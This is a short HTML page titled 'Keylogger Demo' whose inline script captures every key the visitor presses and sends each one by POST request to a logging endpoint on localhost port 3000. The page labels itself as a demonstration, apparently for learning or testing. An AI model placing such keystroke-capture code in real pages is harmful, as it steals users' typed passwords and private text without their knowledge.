<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Demo</title>
</head>
<body>
    <h1>Press Any Key</h1>
    <script>
        document.addEventListener("keydown", function(event) {
    fetch("http://localhost:3000/log", {  // Ensure this matches your backend port
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.key })
    }).catch(err => console.error("Error:", err)); // Log errors in the browser console
});
    </script>
</body>
</html>
